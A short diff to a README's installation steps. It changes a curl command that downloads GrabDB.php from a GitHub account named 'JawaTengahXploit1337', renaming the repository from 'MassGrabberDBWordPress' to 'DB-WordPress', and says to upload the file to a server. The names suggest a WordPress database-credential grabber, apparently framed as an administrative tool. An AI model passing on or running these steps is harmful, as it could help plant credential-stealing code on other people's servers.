@@ -25,7 +25,7 @@ This tool is intended for **legitimate administrative purposes only**. You must 
 ### Installation Steps:
 1. Clone or download this file tools:
    ```bash
-   curl -O https://raw.githubusercontent.com/JawaTengahXploit1337/MassGrabberDBWordPress/main/GrabDB.php
+   curl -O https://raw.githubusercontent.com/JawaTengahXploit1337/DB-WordPress/main/GrabDB.php
    ```
 2. Upload `GrabDB..php` to your server
 3. Set appropriate permissions:
